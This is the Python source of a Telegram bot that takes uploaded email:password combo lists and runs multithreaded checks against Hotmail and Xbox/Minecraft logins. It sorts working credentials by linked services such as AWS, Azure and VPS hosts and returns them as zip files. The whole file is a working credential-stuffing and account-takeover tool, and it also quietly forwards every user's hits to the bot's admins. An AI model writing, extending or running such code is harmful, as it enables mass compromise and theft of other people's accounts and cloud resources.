import io
import os
import re
import tempfile
import threading
import time
import zipfile
from queue import Queue, Empty

import telebot
from telebot import types

from config import (
    ADMIN_IDS,
    BOT_DEV,
    BOT_NAME,
    BOT_TOKEN,
    DEFAULT_THREADS,
    MAX_LINES,
    PROGRESS_UPDATE_SECONDS,
)
from hotmail_checker import HotmailChecker
from xbox_checker import XboxChecker
from stats import StatsStore, UsersStore


bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML", threaded=True)
hotmail_checker = HotmailChecker()
xbox_checker = XboxChecker(verbose=True)

DB_PATH = "bot.db"
stats = StatsStore(DB_PATH)
users_store = UsersStore(DB_PATH, "users.json")

jobs = {}
active_by_user = {}
job_lock = threading.Lock()

pending_limits = {}
pending_files = {}
maintenance_mode = False


def is_admin(user_id):
    return user_id in ADMIN_IDS


def format_header(checker_type="inboxer"):
    if checker_type == "xbox":
        return "<b>XboX Checker</b>"
    return "<b>Hᴏᴛᴍᴀɪʟ Iɴʙᴏx Sᴇᴀʀᴄʜᴇʀ</b>"


def format_duration(seconds):
    seconds = max(0, int(seconds))
    h = seconds // 3600
    m = (seconds % 3600) // 60
    s = seconds % 60
    return f"{h:02d}:{m:02d}:{s:02d}"



def format_progress(job):
    elapsed = time.time() - job.start_time
    cpm = int((job.processed / elapsed) * 60) if elapsed > 0 else 0
    status_line = "🟡 Running" if not job.stop_event.is_set() else "🛑 Stopping..."
    
    if job.checker_type == "xbox":
        lines = (
            f"{format_header('xbox')}\n"
            f"{status_line}\n"
            f"<code>Progress: {job.processed}/{job.total}\n"
            f"Hits: {job.hits} | Bad: {job.bad} | 2FA: {job.twofa}\n"
            f"XGP Ultimate: {job.xgpu} | XGP: {job.xgp} | Other: {job.other}\n"
            f"Errors: {job.errors} | Fast Retries: {job.fast_retries}\n"
            f"CPM: {cpm} | T/t: {format_duration(elapsed)}</code>\n"
            f"<b>by</b> {BOT_DEV}"
        )
    else:
        lines = (
            f"{format_header()}\n"
            f"{status_line}\n"
            f"<code>Progress: {job.processed}/{job.total}\n"
            f"Hits: {job.hits} | Bad: {job.bad}\n"
            f"CPM: {cpm} | T/t: {format_duration(elapsed)}</code>\n"
            f"<b>by</b> {BOT_DEV}"
        )
    return lines


def format_active_summary(job):
    elapsed = time.time() - job.start_time
    cpm = int((job.processed / elapsed) * 60) if elapsed > 0 else 0
    return (
        f"{format_header(job.checker_type)}\n"
        "<b>Already running a check.</b>\n"
        f"<code>Progress: {job.processed}/{job.total}\n"
        f"Hits: {job.hits} | Bad: {job.bad}\n"
        f"CPM: {cpm} | T/t: {format_duration(elapsed)}</code>\n"
        f"<b>by</b> {BOT_DEV}"
    )

def build_stop_markup(job_id):
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🛑 Stop", callback_data=f"stop:{job_id}"))
    return markup


def build_limit_markup(user_id):
    markup = types.InlineKeyboardMarkup()
    markup.add(
        types.InlineKeyboardButton("✅ Yes", callback_data=f"limit_yes:{user_id}"),
        types.InlineKeyboardButton("❌ No", callback_data=f"limit_no:{user_id}"),
    )
    return markup


def build_checker_selection_markup(user_id, file_data):
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("📥 Inboxer", callback_data=f"checker:inboxer:{user_id}:{file_data}"),
        types.InlineKeyboardButton("🎮 Xbox", callback_data=f"checker:xbox:{user_id}:{file_data}"),
    )
    return markup


def build_admin_markup():
    markup = types.InlineKeyboardMarkup()
    markup.add(
        types.InlineKeyboardButton("📊 Stats", callback_data="adm:stats"),
        types.InlineKeyboardButton("📡 Active Checks", callback_data="adm:active"),
    )
    markup.add(
        types.InlineKeyboardButton("🚧 Toggle Maintenance", callback_data="adm:maint"),
    )
    return markup


class Job:
    def __init__(self, user_id, chat_id, total, threads, user_link, reply_to_message_id, checker_type="inboxer"):
        self.user_id = user_id
        self.chat_id = chat_id
        self.user_link = user_link
        self.reply_to_message_id = reply_to_message_id
        self.total = total
        self.threads = threads
        self.checker_type = checker_type  # "inboxer" or "xbox"
        self.processed = 0
        self.hits = 0
        self.bad = 0
        self.retry = 0
        self.twofa = 0
        self.errors = 0
        self.xgp = 0
        self.xgpu = 0
        self.other = 0
        self.fast_retries = 0
        self.hit_lines = []
        self.service_hits = {}
        self.start_time = time.time()
        self.stop_event = threading.Event()
        self.done_event = threading.Event()
        self.lock = threading.Lock()
        self.message_id = None
        self.job_id = f"{user_id}-{int(self.start_time)}-{checker_type}"


def parse_combos(file_bytes):
    text = file_bytes.decode("utf-8", errors="ignore").replace("\ufeff", "")
    combos = []
    for line in text.splitlines():
        line = line.strip()
        if ":" not in line:
            continue
        email, password = line.split(":", 1)
        email = email.strip()
        password = password.strip()
        if email and password:
            combos.append((email, password))
    return combos


SERVICE_FILENAME_MAP = {
    "Mobile Legends": "mobilelegends.txt",
    "Amazon Web Services (AWS)": "aws_accounts.txt",
    "Microsoft Azure": "azure_accounts.txt",
    "Google Cloud (GCP)": "gcp_accounts.txt",
    "DigitalOcean": "digitalocean_accounts.txt",
    "Vultzr": "vultr_accounts.txt",
    "Linode": "linode_accounts.txt",
    "Hetzner": "hetzner_accounts.txt",
    "OVHcloud": "ovhcloud_accounts.txt",
    "Contabo": "contabo_accounts.txt",
    "RackNerd": "racknerd_accounts.txt",
    "IONOS": "ionos_accounts.txt",
    "Kamatera": "kamatera_accounts.txt",
    "UpCloud": "upcloud_accounts.txt",
    "Hostinger (VPS + RDP)": "hostinger_accounts.txt",
    "InterServer": "interserver_accounts.txt",
    "Xbox Game Pass Ultimate": "XboxGamePassUltimate.txt",
    "Xbox Game Pass": "XboxGamePass.txt",
    "Minecraft": "Minecraft.txt",
    "2FA": "2FA.txt",
    "Other": "Other.txt",
    "Hits": "Hits.txt",
    "Capture": "Capture.txt",
    "Not_Found": "Not_Found.txt",
}


def normalize_service_filename(service_name):
    if service_name in SERVICE_FILENAME_MAP:
        return SERVICE_FILENAME_MAP[service_name]
    slug = re.sub(r"[^a-z0-9]+", "_", service_name.lower()).strip("_")
    if not slug:
        slug = "service"
    return f"{slug}.txt"


def send_hits_file(chat_id, service_hits, hits_total, caption, reply_to_message_id=None, checker_type="inboxer"):
    if not service_hits:
        content = "No hits found.\n" if hits_total == 0 else "No linked services found.\n"
        temp = tempfile.NamedTemporaryFile(delete=False, suffix=".txt")
        try:
            temp.write(content.encode("utf-8", errors="ignore"))
            temp.close()
            with open(temp.name, "rb") as f:
                bot.send_document(chat_id, f, caption=caption, reply_to_message_id=reply_to_message_id)
        finally:
            if os.path.exists(temp.name):
                os.remove(temp.name)
        return

    temp = tempfile.NamedTemporaryFile(delete=False, suffix=".zip")
    try:
        with zipfile.ZipFile(temp.name, "w", zipfile.ZIP_DEFLATED) as zf:
            # For Xbox checker, ensure all required files are created
            if checker_type == "xbox":
                xbox_files = [
                    "Hits.txt",
                    "Capture.txt", 
                    "XboxGamePassUltimate.txt",
                    "XboxGamePass.txt",
                    "Other.txt",
                    "2FA.txt",
                    "Not_Found.txt"
                ]
                
                for filename in xbox_files:
                    lines = service_hits.get(filename, [])
                    if lines:
                        zf.writestr(filename, "".join(lines))
                    else:
                        # Create empty file
                        zf.writestr(filename, "")
            
            # For Inboxer checker, use existing logic
            else:
                for filename in sorted(service_hits):
                    lines = service_hits[filename]
                    if not lines:
                        continue
                    zf.writestr(filename, "".join(lines))
        
        with open(temp.name, "rb") as f:
            bot.send_document(chat_id, f, caption=caption, reply_to_message_id=reply_to_message_id)
    finally:
        if os.path.exists(temp.name):
            os.remove(temp.name)


def update_progress_loop(job):
    while not job.done_event.is_set():
        try:
            bot.edit_message_text(
                format_progress(job),
                chat_id=job.chat_id,
                message_id=job.message_id,
                reply_markup=build_stop_markup(job.job_id),
            )
        except Exception:
            pass
        time.sleep(PROGRESS_UPDATE_SECONDS)

    try:
        bot.edit_message_text(
            format_progress(job),
            chat_id=job.chat_id,
            message_id=job.message_id,
            reply_markup=None,
        )
    except Exception:
        pass


def run_job(job, combos, is_admin_user):
    queue = Queue()
    for combo in combos:
        queue.put(combo)

    def worker():
        while not job.stop_event.is_set():
            try:
                email, password = queue.get_nowait()
            except Empty:
                return
            
            if job.checker_type == "xbox":
                result = xbox_checker.check_account(email, password)
            else:
                result = hotmail_checker.check_account(email, password)
            
            with job.lock:
                status = result.get("status")
                if status == "HIT":
                    job.hits += 1
                    capture = result.get("capture")
                    if capture:
                        job.hit_lines.append(capture)
                    
                    # Handle Xbox-specific file categorization
                    if job.checker_type == "xbox":
                        file_category = result.get("file_category", "Other")
                        hit_line = result.get("hit_line", f"{email}:{password}")
                        
                        # Always add to Hits.txt
                        job.service_hits.setdefault("Hits.txt", []).append(hit_line + "\n")
                        
                        # Always add capture to Capture.txt
                        job.service_hits.setdefault("Capture.txt", []).append(capture)
                        
                        # Add to appropriate category file
                        if file_category == "XboxGamePassUltimate":
                            job.service_hits.setdefault("XboxGamePassUltimate.txt", []).append(hit_line + "\n")
                            job.xgpu += 1
                        elif file_category == "XboxGamePass":
                            job.service_hits.setdefault("XboxGamePass.txt", []).append(hit_line + "\n")
                            job.xgp += 1
                        elif file_category == "Minecraft":
                            job.service_hits.setdefault("Other.txt", []).append(hit_line + " | Minecraft\n")
                            job.other += 1
                        elif file_category == "Other":
                            job.service_hits.setdefault("Other.txt", []).append(hit_line + " | " + result.get("account_type", "") + "\n")
                            job.other += 1
                    
                    # Handle Inboxer hits
                    else:
                        services = result.get("services") or []
                        if capture:
                            for service_name in services:
                                filename = normalize_service_filename(service_name)
                                job.service_hits.setdefault(filename, []).append(capture)
                
                elif status == "BAD":
                    job.bad += 1
                    # For Xbox checker, BAD means failed authentication
                    # We don't save these to Not_Found.txt
                
                elif status == "NO_ENTITLEMENTS":
                    job.bad += 1
                    # For Xbox checker, NO_ENTITLEMENTS means successful login but no Minecraft
                    # Save to Not_Found.txt
                    if job.checker_type == "xbox":
                        reason = result.get("reason", "No Minecraft entitlements")
                        hit_line = result.get("hit_line", f"{email}:{password}")
                        job.service_hits.setdefault("Not_Found.txt", []).append(
                            f"{hit_line} | {reason}\n"
                        )
                
                elif status == "2FA":
                    job.twofa += 1
                    email_val = result.get("email", "")
                    password_val = result.get("password", "")
                    if email_val and password_val:
                        # For Xbox checker, save 2FA hits to 2FA.txt
                        filename = "2FA.txt" if job.checker_type == "xbox" else normalize_service_filename("2FA")
                        job.service_hits.setdefault(filename, []).append(f"{email_val}:{password_val}\n")
                
                elif status == "ERROR":
                    job.errors += 1
                else:
                    job.retry += 1
                
                job.processed += 1
            queue.task_done()

    threads = []
    for _ in range(job.threads):
        t = threading.Thread(target=worker, daemon=True)
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    job.done_event.set()

    status_label = "Completed" if not job.stop_event.is_set() else "Stopped"
    elapsed = time.time() - job.start_time
    cpm = int((job.processed / elapsed) * 60) if elapsed > 0 else 0

    if job.checker_type == "xbox":
        summary = (
            f"{format_header('xbox')}\n"
            f"<b>{status_label}</b> ✅\n"
            f"<code>Checked: {job.processed}/{job.total}\n"
            f"Hits: {job.hits} | Bad: {job.bad} | 2FA: {job.twofa}\n"
            f"XGP Ultimate: {job.xgpu} | XGP: {job.xgp} | Other: {job.other}\n"
            f"Errors: {job.errors} | Fast Retries: {job.fast_retries}\n"
            f"CPM: {cpm} | Time: {format_duration(elapsed)}</code>\n"
            f"<b>by</b> {BOT_DEV}"
        )
    else:
        summary = (
            f"{format_header()}\n"
            f"<b>{status_label}</b> ✅\n"
            f"<code>Checked: {job.processed}/{job.total}\n"
            f"Hits: {job.hits} | Bad: {job.bad} | Retry: {job.retry}\n"
            f"CPM: {cpm} | Time: {format_duration(elapsed)}</code>\n"
            f"<b>by</b> {BOT_DEV}"
        )

    send_hits_file(
        job.chat_id,
        job.service_hits,
        job.hits,
        summary,
        reply_to_message_id=job.reply_to_message_id,
        checker_type=job.checker_type,
    )

    if job.checker_type == "xbox":
        admin_caption = (
            f"{format_header('xbox')}\n"
            f"<b>{status_label}</b> ✅\n"
            f"<code>Checked: {job.processed}/{job.total}\n"
            f"Hits: {job.hits} | Bad: {job.bad} | 2FA: {job.twofa}\n"
            f"XGP Ultimate: {job.xgpu} | XGP: {job.xgp} | Other: {job.other}\n"
            f"Errors: {job.errors} | Fast Retries: {job.fast_retries}\n"
            f"CPM: {cpm} | Time: {format_duration(elapsed)}</code>\n"
            f"<b>User:</b> {job.user_link}\n"
            f"<b>by</b> {BOT_DEV}"
        )
    else:
        admin_caption = (
            f"{format_header()}\n"
            f"<b>{status_label}</b> ✅\n"
            f"<code>Checked: {job.processed}/{job.total}\n"
            f"Hits: {job.hits} | Bad: {job.bad} | Retry: {job.retry}\n"
            f"CPM: {cpm} | Time: {format_duration(elapsed)}</code>\n"
            f"<b>User:</b> {job.user_link}\n"
            f"<b>by</b> {BOT_DEV}"
        )

    for admin_id in ADMIN_IDS:
        try:
            send_hits_file(admin_id, job.service_hits, job.hits, admin_caption, checker_type=job.checker_type)
        except Exception:
            pass

    stats.add_user(job.user_id)
    stats.add_run(job.processed, job.hits)

    with job_lock:
        jobs.pop(job.job_id, None)
        if not is_admin_user:
            active_by_user.pop(job.user_id, None)

    print(f"[DONE] job_id={job.job_id} user_id={job.user_id} checker_type={job.checker_type} status={status_label} hits={job.hits} bad={job.bad} retry={job.retry}")


def start_job(chat_id, user_id, combos, user_link, is_admin_user, reply_to_message_id, checker_type="inboxer"):
    with job_lock:
        if not is_admin_user and user_id in active_by_user:
            job = jobs.get(active_by_user[user_id])
            if job:
                bot.send_message(
                    chat_id,
                    format_active_summary(job),
                    reply_to_message_id=reply_to_message_id,
                )
            else:
                bot.send_message(
                    chat_id,
                    "⚠️ Only one check at a time is allowed.",
                    reply_to_message_id=reply_to_message_id,
                )
            return
        job = Job(user_id, chat_id, len(combos), DEFAULT_THREADS, user_link, reply_to_message_id, checker_type)
        jobs[job.job_id] = job
        if not is_admin_user:
            active_by_user[user_id] = job.job_id

    msg = bot.send_message(chat_id, "🟡 Starting checker...", reply_to_message_id=reply_to_message_id)
    job.message_id = msg.message_id

    updater = threading.Thread(target=update_progress_loop, args=(job,), daemon=True)
    updater.start()

    runner = threading.Thread(target=run_job, args=(job, combos, is_admin_user), daemon=True)
    runner.start()
    print(f"[START] job_id={job.job_id} user_id={user_id} combos={len(combos)} threads={DEFAULT_THREADS}")


@bot.message_handler(commands=["start"])
def handle_start(message):
    print(f"[START_CMD] user_id={message.from_user.id}")
    users_store.add_user(message.from_user.id)
    stats.add_user(message.from_user.id)
    welcome = (
        f"{format_header()}\n\n"
        "📥 <b>Upload a .txt file with email:pass combos.</b>\n\n"
        "<b>Available Checkers</b>\n"
        "• 📥 Inboxer - Check for linked services\n"
        "• 🎮 Xbox - Check for Xbox/Minecraft accounts\n\n"
        "<b>Features</b>\n"
        "• Max 6,000 Lines per user\n"
        f"• {DEFAULT_THREADS} Threads For Fast Checking\n"
        "• Results Sent As .zip\n\n"
        "⚠️ <b>Only One Check At A Time Allowed.</b>\n\n"
        f"<b>Bot dev:</b> {BOT_DEV}"
    )
    bot.send_message(message.chat.id, welcome, reply_to_message_id=message.message_id)


@bot.message_handler(commands=["status"])
def handle_status(message):
    if not is_admin(message.from_user.id):
        return
    print(f"[STATUS_CMD] admin_id={message.from_user.id}")
    snap = stats.snapshot()
    text = (
        f"{format_header()}\n"
        f"<b>Admin Status</b>\n"
        f"<code>Total Users: {snap['total_users']}\n"
        f"Total Lines Checked: {snap['total_lines_checked']}\n"
        f"Total Hits: {snap['total_hits']}</code>\n"
        f"<b>by</b> {BOT_DEV}"
    )
    bot.send_message(message.chat.id, text, reply_to_message_id=message.message_id)


@bot.message_handler(commands=["fetch_all"])
def handle_fetch_all(message):
    if not is_admin(message.from_user.id):
        return
    users_store.export_json()
    if not os.path.exists(users_store.json_path):
        bot.send_message(
            message.chat.id,
            "❌ users.json not found.",
            reply_to_message_id=message.message_id,
        )
        return
    with open(users_store.json_path, "rb") as f:
        bot.send_document(
            message.chat.id,
            f,
            caption=f"{format_header()}\n<b>Users export</b>\n<b>by</b> {BOT_DEV}",
            reply_to_message_id=message.message_id,
        )


@bot.message_handler(commands=["adm"])
def handle_admin_panel(message):
    if not is_admin(message.from_user.id):
        return
    print(f"[ADMIN_PANEL] admin_id={message.from_user.id}")
    text = (
        f"{format_header()}\n"
        "<b>Admin Panel</b>\n"
        "Choose an option below.\n"
        f"<b>by</b> {BOT_DEV}"
    )
    bot.send_message(
        message.chat.id, text, reply_markup=build_admin_markup(), reply_to_message_id=message.message_id
    )


@bot.message_handler(commands=["broadcast"])
def handle_broadcast(message):
    if not is_admin(message.from_user.id):
        return
    if not message.reply_to_message or not message.reply_to_message.text:
        bot.send_message(
            message.chat.id,
            "⚠️ Reply to a text message to broadcast it.",
            reply_to_message_id=message.message_id,
        )
        return

    payload = message.reply_to_message.text
    users = users_store.list_users()
    total = len(users)
    sent = 0
    failed = 0

    progress_msg = bot.send_message(
        message.chat.id,
        f"{format_header()}\n<b>Broadcasting...</b>\n<code>Total: {total}\nSent: 0\nFailed: 0</code>\n<b>by</b> {BOT_DEV}",
        reply_to_message_id=message.message_id,
    )

    for user_id in users:
        try:
            bot.send_message(user_id, payload)
            sent += 1
        except Exception:
            failed += 1
        if (sent + failed) % 10 == 0 or (sent + failed) == total:
            try:
                bot.edit_message_text(
                    f"{format_header()}\n<b>Broadcasting...</b>\n<code>Total: {total}\nSent: {sent}\nFailed: {failed}</code>\n<b>by</b> {BOT_DEV}",
                    message.chat.id,
                    progress_msg.message_id,
                )
            except Exception:
                pass

    try:
        bot.edit_message_text(
            f"{format_header()}\n<b>Broadcast done ✅</b>\n<code>Total: {total}\nSent: {sent}\nFailed: {failed}</code>\n<b>by</b> {BOT_DEV}",
            message.chat.id,
            progress_msg.message_id,
        )
    except Exception:
        pass


@bot.callback_query_handler(func=lambda call: call.data.startswith("adm:"))
def handle_admin_actions(call):
    if not is_admin(call.from_user.id):
        return
    print(f"[ADMIN_ACTION] admin_id={call.from_user.id} action={call.data}")

    action = call.data.split(":", 1)[1]
    if action == "stats":
        snap = stats.snapshot()
        text = (
            f"{format_header()}\n"
            f"<b>Admin Status</b>\n"
            f"<code>Total Users: {snap['total_users']}\n"
            f"Total Lines Checked: {snap['total_lines_checked']}\n"
            f"Total Hits: {snap['total_hits']}</code>\n"
            f"<b>by</b> {BOT_DEV}"
        )
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=build_admin_markup())
    elif action == "active":
        with job_lock:
            active = list(jobs.values())
        if not active:
            text = f"{format_header()}\n<b>No active checks right now.</b>\n<b>by</b> {BOT_DEV}"
        else:
            lines = [
                f"{format_header()}",
                "<b>Active Checks</b>",
            ]
            for job in active:
                lines.append(
                    f"<code>User {job.user_id}: {job.processed}/{job.total} | Hits: {job.hits}</code>"
                )
            lines.append(f"<b>by</b> {BOT_DEV}")
            text = "\n".join(lines)
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=build_admin_markup())
    elif action == "maint":
        global maintenance_mode
        maintenance_mode = not maintenance_mode
        status = "ON" if maintenance_mode else "OFF"
        text = (
            f"{format_header()}\n"
            f"<b>Maintenance Mode:</b> {status}\n"
            f"<b>by</b> {BOT_DEV}"
        )
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=build_admin_markup())

    bot.answer_callback_query(call.id)


@bot.callback_query_handler(func=lambda call: call.data.startswith("stop:"))
def handle_stop(call):
    job_id = call.data.split(":", 1)[1]
    with job_lock:
        job = jobs.get(job_id)
        if job and not is_admin(call.from_user.id) and job.user_id != call.from_user.id:
            job = None
    if not job or job.job_id != job_id:
        bot.answer_callback_query(call.id, "No active check.", show_alert=True)
        return

    job.stop_event.set()
    print(f"[STOP] job_id={job.job_id} by_user={call.from_user.id}")
    bot.answer_callback_query(call.id, "Stopping...", show_alert=False)


@bot.callback_query_handler(func=lambda call: call.data.startswith("limit_"))
def handle_limit_decision(call):
    user_id = int(call.data.split(":", 1)[1])
    if call.from_user.id != user_id:
        bot.answer_callback_query(call.id, "Not for you.", show_alert=True)
        return

    pending = pending_limits.pop(user_id, None)
    if not pending:
        bot.answer_callback_query(call.id, "Expired.", show_alert=True)
        return

    if call.data.startswith("limit_yes"):
        checker_type = pending.get("checker_type", "inboxer")
        start_job(
            pending["chat_id"],
            user_id,
            pending["combos"],
            pending["user_link"],
            pending["is_admin"],
            pending["reply_to_message_id"],
            checker_type=checker_type
        )
        bot.edit_message_text(
            f"{format_header(checker_type)}\n<b>Starting with first {len(pending['combos'])} lines.</b>",
            call.message.chat.id,
            call.message.message_id,
        )
    else:
        bot.edit_message_text(
            f"{format_header()}\n<b>Cancelled.</b>",
            call.message.chat.id,
            call.message.message_id,
        )

    bot.answer_callback_query(call.id)


@bot.callback_query_handler(func=lambda call: call.data.startswith("checker:"))
def handle_checker_selection(call):
    try:
        parts = call.data.split(":")
        if len(parts) < 4:
            try:
                bot.answer_callback_query(call.id, "Invalid selection.", show_alert=True)
            except:
                pass
            return
            
        checker_type = parts[1]
        user_id = int(parts[2])
        file_hash = parts[3]
        
        if call.from_user.id != user_id:
            try:
                bot.answer_callback_query(call.id, "Not for you.", show_alert=True)
            except:
                pass
            return
        
        file_data = pending_files.pop(file_hash, None)
        if not file_data:
            try:
                bot.answer_callback_query(call.id, "File data expired.", show_alert=True)
            except:
                pass
            return
        
        # Check if the callback is too old (more than 1 hour)
        if time.time() - file_data.get("timestamp", 0) > 3600:
            try:
                bot.answer_callback_query(call.id, "Selection expired. Please upload file again.", show_alert=True)
            except:
                pass
            return
        
        combos = file_data["combos"]
        total = file_data["total"]
        chat_id = file_data["chat_id"]
        user_link_val = file_data["user_link"]
        is_admin_user = file_data["is_admin"]
        reply_to_message_id = file_data["reply_to_message_id"]
        
        # Check line limit for non-admin users
        if not is_admin_user and total > MAX_LINES:
            preview = (
                f"{format_header(checker_type)}\n"
                f"<b>More than {MAX_LINES} lines detected.</b>\n"
                f"Total combos in file: <b>{total}</b>\n\n"
                f"We will check only the first <b>{MAX_LINES}</b>.\n"
                "Do you want to continue?"
            )
            pending_limits[user_id] = {
                "chat_id": chat_id,
                "combos": combos[:MAX_LINES],
                "user_link": user_link_val,
                "is_admin": is_admin_user,
                "reply_to_message_id": reply_to_message_id,
                "checker_type": checker_type,
                "timestamp": time.time()
            }
            bot.edit_message_text(
                preview,
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                reply_markup=build_limit_markup(user_id),
            )
            bot.answer_callback_query(call.id, "Line limit check...", show_alert=False)
            return
        
        # Start the job with selected checker type
        start_job(
            chat_id,
            user_id,
            combos,
            user_link_val,
            is_admin_user,
            reply_to_message_id,
            checker_type=checker_type
        )
        
        bot.edit_message_text(
            f"{format_header(checker_type)}\n<b>Starting {checker_type} checker...</b>",
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
        )
        bot.answer_callback_query(call.id, f"Starting {checker_type}...", show_alert=False)
        
    except Exception as e:
        print(f"[ERROR] handle_checker_selection: {e}")
        try:
            bot.answer_callback_query(call.id, "Error occurred.", show_alert=True)
        except:
            pass  # Ignore if callback query is too old


@bot.message_handler(content_types=["document"])
def handle_document(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    print(f"[UPLOAD] user_id={user_id} filename={message.document.file_name}")
    users_store.add_user(user_id)
    stats.add_user(user_id)

    if maintenance_mode and not is_admin(user_id):
        bot.send_message(
            chat_id,
            "🚧 Maintenance mode is ON. Try again later.",
            reply_to_message_id=message.message_id,
        )
        return

    with job_lock:
        if user_id in active_by_user and not is_admin(user_id):
            job = jobs.get(active_by_user[user_id])
            if job:
                bot.send_message(
                    chat_id,
                    format_active_summary(job),
                    reply_to_message_id=message.message_id,
                )
            else:
                bot.send_message(
                    chat_id,
                    "⚠️ Only one check at a time is allowed.",
                    reply_to_message_id=message.message_id,
                )
            return

    doc = message.document
    if not doc.file_name.lower().endswith(".txt"):
        bot.send_message(
            chat_id,
            "❌ Please upload a .txt file only.",
            reply_to_message_id=message.message_id,
        )
        return

    try:
        file_info = bot.get_file(doc.file_id)
        downloaded = bot.download_file(file_info.file_path)
    except Exception:
        bot.send_message(
            chat_id,
            "❌ Failed to download the file. Try again.",
            reply_to_message_id=message.message_id,
        )
        return

    combos = parse_combos(downloaded)
    if not combos:
        bot.send_message(
            chat_id,
            "⚠️ No valid combos found in the file.",
            reply_to_message_id=message.message_id,
        )
        return

    is_admin_user = is_admin(user_id)
    total = len(combos)

    # Create a unique ID for this file data
    import hashlib
    file_hash = hashlib.md5(str(combos).encode()).hexdigest()[:16]
    
    # Store the combos data
    pending_files[file_hash] = {
        "combos": combos,
        "total": total,
        "user_id": user_id,
        "chat_id": chat_id,
        "user_link": user_link(message.from_user),
        "is_admin": is_admin_user,
        "reply_to_message_id": message.message_id,
        "timestamp": time.time()
    }
    
    # Show checker selection buttons
    selection_text = (
        f"{format_header()}\n"
        f"<b>File loaded successfully!</b>\n"
        f"Total combos: <b>{total}</b>\n\n"
        f"<b>Select checker type:</b>\n"
        f"• 📥 Inboxer - Check for linked services\n"
        f"• 🎮 Xbox - Check for Xbox/Minecraft accounts\n"
    )
    
    bot.send_message(
        chat_id,
        selection_text,
        reply_markup=build_checker_selection_markup(user_id, file_hash),
        reply_to_message_id=message.message_id,
    )


def user_link(user):
    if user.username:
        return f"@{user.username}"
    return f"<a href=\"tg://user?id={user.id}\">User</a>"


def cleanup_old_pending_files():
    """Remove pending files and limits older than 1 hour"""
    current_time = time.time()
    
    # Clean old pending files
    to_remove_files = []
    for file_hash, data in pending_files.items():
        if current_time - data.get("timestamp", 0) > 3600:  # 1 hour
            to_remove_files.append(file_hash)
    
    for file_hash in to_remove_files:
        pending_files.pop(file_hash, None)
    
    # Clean old pending limits
    to_remove_limits = []
    for user_id, data in pending_limits.items():
        if current_time - data.get("timestamp", 0) > 3600:  # 1 hour
            to_remove_limits.append(user_id)
    
    for user_id in to_remove_limits:
        pending_limits.pop(user_id, None)
    
    if to_remove_files or to_remove_limits:
        print(f"[CLEANUP] Removed {len(to_remove_files)} old pending files and {len(to_remove_limits)} old pending limits")


def cleanup_worker():
    """Background worker for periodic cleanup"""
    while True:
        time.sleep(3600)  # Run every hour
        cleanup_old_pending_files()

def main():
    print(f"[BOOT] {BOT_NAME} starting...")
    
    # Cleanup old pending files on startup
    cleanup_old_pending_files()
    
    # Start cleanup thread
    cleanup_thread = threading.Thread(target=cleanup_worker, daemon=True)
    cleanup_thread.start()
    
    print(f"[BOOT] {BOT_NAME} started successfully!")
    print(f"[BOOT] Admin IDs: {ADMIN_IDS}")
    print(f"[BOOT] Max lines per user: {MAX_LINES}")
    print(f"[BOOT] Default threads: {DEFAULT_THREADS}")
    print(f"[BOOT] Cleanup thread started")
    
    # Start the bot
    bot.infinity_polling(skip_pending=True)


if __name__ == "__main__":
    main()
